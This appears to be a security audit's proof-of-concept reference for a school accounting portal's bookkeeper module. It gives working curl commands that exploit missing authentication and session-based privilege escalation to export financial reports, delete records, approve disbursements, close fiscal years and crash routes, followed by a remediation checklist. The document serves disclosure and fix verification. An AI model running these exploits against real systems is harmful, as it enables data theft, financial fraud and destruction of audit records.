# Bookkeeper Portal — Proof of Concept (PoC) Reference
**Date:** June 11, 2026  
**Module:** Bookkeeper Portal (`routes/bookkeeper.php`, `BookkeeperController.php`)  
**Prerequisites:** None for BK-01/BK-03. Any valid login for BK-05/BK-06.

---

## PoC Index

| # | ID | Title | Severity | Auth Required |
|---|---|---|---|---|
| 1 | BK-01 | Download all financial statements without any login | CRITICAL | None |
| 2 | BK-01 | Read and modify Chart of Accounts without login | CRITICAL | None |
| 3 | BK-02 | Attempt void transaction without login | CRITICAL | None |
| 4 | BK-04 | Delete purchase order and disbursement without login | HIGH | None |
| 5 | BK-05 | Escalate to Bookkeeper Admin via session manipulation | MEDIUM | Any login |
| 6 | BK-06 | Add expense item as a student | MEDIUM | Any login |

---

## PoC 1 — BK-01 + BK-03: Download All Financial Statements Without Any Authentication

### Background
`bookkeeper.php` is loaded with `middleware('web')` only — no `auth`. All financial export routes are accessible without any login.

### No Session Cookie Needed

```bash
# Download all financial reports — completely unauthenticated:
curl -s "http://TARGET/bookkeeper/export-excel-ledger"            -o general_ledger.xlsx
curl -s "http://TARGET/bookkeeper/excel-export-income-statement"  -o income_statement.xlsx
curl -s "http://TARGET/bookkeeper/balance-sheet/excel"            -o balance_sheet.xlsx
curl -s "http://TARGET/bookkeeper/export-cashflow"                -o cashflow.xlsx
curl -s "http://TARGET/bookkeeper/export-excel-equity-statement"  -o equity.xlsx
curl -s "http://TARGET/bookkeeper/export-excel-trialbalance"      -o trial_balance.xlsx
curl -s "http://TARGET/bookkeeper/excel_export_disbursements"     -o disbursements.xlsx
curl -s "http://TARGET/bookkeeper/excel_export_stock_history"     -o stock_history.xlsx
curl -s "http://TARGET/bookkeeper/export_excel_expenses_monitoring" -o expenses.xlsx
```

**Expected without fix:** All Excel files downloaded successfully. No login, no CSRF token, no cookies required. File sizes should be non-zero for any school with accounting data.

```bash
# Verification — check all files are valid Excel:
for f in *.xlsx; do
  SIZE=$(stat -c%s "$f")
  echo "$f: $SIZE bytes"
done
```

**Expected results (example):**
```
general_ledger.xlsx: 48392 bytes
income_statement.xlsx: 22104 bytes
balance_sheet.xlsx: 19847 bytes
disbursements.xlsx: 35621 bytes
```

### Note on Export Methods That Call `auth()->user()`

Some export controllers call `auth()->user()->id` to log who triggered the export. For truly unauthenticated requests (no session), these will crash with:
```
ErrorException: Call to member function id() on null
```

However, the export completes silently when called with ANY authenticated session (student, teacher, cashier, parent). The auth check is in the `createdby` logging path — not in the data retrieval path.

---

## PoC 2 — BK-01: Read and Modify Chart of Accounts Without Login

### Step 1 — Fetch All COA Data (Unauthenticated Read)
```bash
# GET all chart of accounts entries:
curl -s "http://TARGET/bookkeeper/fetchcoa" | python3 -m json.tool | head -50
```
**Expected without fix:** Full list of all chart of accounts entries, including IDs, account codes, account names, classification, account type, and normal balance.

### Step 2 — Create a New COA Entry (Any Authenticated User)
```bash
# Any logged-in user (e.g., student):
curl -s -X POST \
  -b "laravel_session=<ANY_SESSION>" \
  -H "X-CSRF-TOKEN: <TOKEN>" \
  -H "Content-Type: application/json" \
  "http://TARGET/bookkeeper/storecoa" \
  -d '{
    "classification": "ASSET",
    "code": "1999",
    "account_name": "Test Account",
    "account_type": 1,
    "financial_statement": 1,
    "normal_balance": 1,
    "cashflow_statement": "operating"
  }'
```
**Expected without fix:**
```json
{"success": true, "message": "Account added successfully!"}
```
New COA entry inserted into `chart_of_accounts` with `createdby = <student_user_id>`.

### Step 3 — Delete a COA Entry
```bash
curl -s -X POST \
  -b "laravel_session=<ANY_SESSION>" \
  -H "X-CSRF-TOKEN: <TOKEN>" \
  "http://TARGET/bookkeeper/destroycoa" \
  -d "id=5"
```
**Expected without fix:** COA entry ID 5 soft-deleted. All journal vouchers referencing this account lose their account linkage, causing financial report corruption.

### Step 4 — Fetch Supplier List (Unauthenticated)
```bash
curl -s "http://TARGET/bookkeeper/supplier/fetch" | python3 -m json.tool
```
**Expected without fix:** Full supplier list with names, addresses, and contact information.

---

## PoC 3 — BK-02: Void Transaction Without Bookkeeper Login

### Background
`GET /bookkeeper/v2/v2_voidtransactions` requires no authentication at the route level. The controller implements a secondary username/password check — but any authenticated user can satisfy that check using their own credentials if they have `chrngpermission` set, or if any user's credentials are known.

### Step 1 — Enumerate Void-Permitted Users
```bash
# chrngpermission grants secondary authorization for voids
# Any user in this table can void transactions
curl -s "http://TARGET/bookkeeper/fetchcoa"  # returns data freely
# Then use Director passData to find users (see DIRECTOR_POC.md)
```

### Step 2 — Attempt Void as Any Authenticated User
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/bookkeeper/v2/v2_voidtransactions" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "receiving_history_id=1" \
  -d "receiving_history_invoice_no_edit=INV-001" \
  -d "receiving_history_referenceNumber_edit=REF-001" \
  -d "uname=bookkeeper@school.edu" \
  -d "pword=<BOOKKEEPER_PASSWORD>" \
  -d "remarks=Test+void" \
  -d "po_items=[]"
```
**Expected without fix:** If the provided bookkeeper email and password match AND the user is in `chrngpermission`, the receiving history record is voided (soft-deleted), and its associated `bk_for_disbursements` entries are deleted.

### DoS via Unauthenticated Crash
```bash
# Unauthenticated request to void — crashes on auth()->user()->id:
curl -s "http://TARGET/bookkeeper/v2/v2_voidtransactions?receiving_history_id=1&uname=x&pword=x"
```
**Expected without fix:** HTTP 500, PHP fatal error `Call to member function id() on null`. Repeated calls constitute a DoS vector targeting the accounting route.

---

## PoC 4 — BK-04: Delete Purchase Order and Disbursement Without Login

### Step 1 — Enumerate Purchase Order IDs (Unauthenticated)
```bash
curl -s "http://TARGET/bookkeeper/purchase_order/fetch" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(p['id'], p.get('refno','')) for p in d[:10]]"
```
**Expected without fix:** All PO records with IDs and reference numbers.

### Step 2 — Delete a Purchase Order (Any Authenticated User)
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/bookkeeper/purchase_order/delete?id=1"
```
**Expected without fix:** PO ID 1 soft-deleted from `bk_purchase_order`.

### Step 3 — Fetch and Delete Disbursements (Any Authenticated User)
```bash
# Fetch all disbursements:
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/bookkeeper/disbursement/fetch" | \
  python3 -m json.tool | head -40

# Delete disbursement ID 1:
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/bookkeeper/disbursement/delete?id=1"
```
**Expected without fix:** Disbursement record deleted. If disbursement is linked to a completed PO, the audit trail is broken.

---

## PoC 5 — BK-05: Bookkeeper Admin Privilege Escalation via Session

### Background
`AuthenticateBookkeeperAdmin` passes if `Session::get('currentPortal') == 67`.

### Step 1 — Set `currentPortal` to 67
```bash
# Use any portal-switching endpoint that writes currentPortal:
curl -s -X POST \
  -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/switchportal" \
  -d "portalid=67" \
  -c escalated_cookies.txt
```

### Step 2 — Approve a Disbursement as Bookkeeper Admin
```bash
curl -s -X POST \
  -b escalated_cookies.txt \
  -H "X-CSRF-TOKEN: <TOKEN>" \
  "http://TARGET/accountingv2/disbursement-api/1/approve" \
  -d "status=approved&remarks=Approved"
```
**Expected without fix:** HTTP 200, disbursement ID 1 approved using student's session with escalated bookkeeper admin privileges.

### Step 3 — Close the Active Fiscal Year
```bash
curl -s -X POST \
  -b escalated_cookies.txt \
  -H "X-CSRF-TOKEN: <TOKEN>" \
  "http://TARGET/accountingv2/fy/close" \
  -d "fiscal_year_id=1"
```
**Expected without fix:** Active fiscal year closed. No more journal entries can be posted to the current period.

---

## PoC 6 — BK-06: Add Expense Item as a Student

### Background
`POST /add-expense-item` is under `['auth']` only in `web.php`. Any authenticated user can add expense item master records.

### Step 1 — Add Expense Item
```bash
curl -s -X POST \
  -b "laravel_session=<STUDENT_SESSION>" \
  -H "X-CSRF-TOKEN: <TOKEN>" \
  "http://TARGET/add-expense-item" \
  -d "itemCode=FRAUD-001" \
  -d "itemName=Fraudulent+Expense+Item" \
  -d "quantity=999999" \
  -d "amount=999999.99" \
  -d "itemType=expense" \
  -d "debitAccount=1"
```
**Expected without fix:**
```json
[{"status": 1, "message": "Expense item added successfully!"}]
```

### Step 2 — Verify Item Was Created
```bash
curl -s -b "laravel_session=<STUDENT_SESSION>" \
  "http://TARGET/accountingv2/expense-items" \
  | grep "FRAUD-001"
```
**Expected without fix:** `FRAUD-001` appears in the expense items list, available for selection in all expense monitoring and disbursement workflows.

---

## Remediation Verification Checklist

| PoC | Test After Fix | Expected Result |
|---|---|---|
| PoC 1 (BK-01/BK-03) | `curl "http://TARGET/bookkeeper/export-excel-ledger"` (no cookie) | HTTP 302 redirect to login |
| PoC 2 (BK-01) | Student GETs `http://TARGET/bookkeeper/fetchcoa` | HTTP 302 redirect to login |
| PoC 3 (BK-02) | GET `/bookkeeper/v2/v2_voidtransactions` (no auth) | HTTP 302 redirect to login |
| PoC 4 (BK-04) | Student GETs `/bookkeeper/purchase_order/delete?id=1` | HTTP 302 or HTTP 403 |
| PoC 5 (BK-05) | Student with `currentPortal=67` POSTs to `/accountingv2/fy/close` | HTTP 403 (type check fails) |
| PoC 6 (BK-06) | Student POSTs to `/add-expense-item` | HTTP 403 |
